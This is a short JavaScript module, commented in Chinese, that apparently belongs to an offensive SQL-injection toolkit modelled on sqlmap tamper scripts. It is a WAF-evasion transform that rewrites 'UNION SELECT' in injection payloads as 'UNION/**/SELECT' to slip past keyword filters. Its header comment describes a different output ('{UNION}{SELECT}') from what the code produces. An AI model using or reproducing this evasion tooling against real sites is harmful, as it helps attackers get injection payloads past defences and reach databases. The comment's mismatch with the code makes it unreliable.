// UNION -> NO UNION 绕过：将 UNION SELECT 转换为 {UNION}{SELECT} 绕过 WAF 关键字检测
// 对标 sqlmap union2no.py，通过插入特殊字符分割关键字
export const union2no = {
  name: 'union2no',
  description: '在 UNION SELECT 关键字间插入特殊标记，绕过 WAF 关键字检测',
  /**
   * @param {string} payload
   * @param {object} ctx
   * @returns {string}
   */
  transform(payload, ctx) {
    return String(payload ?? '')
      .replace(/\bUNION\s+SELECT\b/gi, (match) => {
        const isUpper = match[0] === 'U';
        return isUpper ? 'UNION/**/SELECT' : 'union/**/select';
      });
  },
};
export default union2no;
